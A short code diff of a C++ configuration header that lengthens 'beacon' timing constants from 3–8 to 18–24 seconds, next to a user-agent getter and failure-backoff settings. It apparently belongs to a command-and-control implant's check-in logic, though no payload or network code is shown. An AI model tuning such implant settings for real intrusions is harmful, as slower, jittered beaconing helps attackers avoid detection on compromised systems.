@@ -12,8 +12,8 @@ namespace config {
     const wchar_t* GetUserAgent();
 
     // Beacon timing — values in SECONDS
-    constexpr uint32_t BEACON_MIN = 3;
-    constexpr uint32_t BEACON_MAX = 8;
+    constexpr uint32_t BEACON_MIN = 18;
+    constexpr uint32_t BEACON_MAX = 24;
     constexpr uint32_t MAX_FAILURES = 5;
     constexpr uint32_t BACKOFF_FACTOR = 3;
 
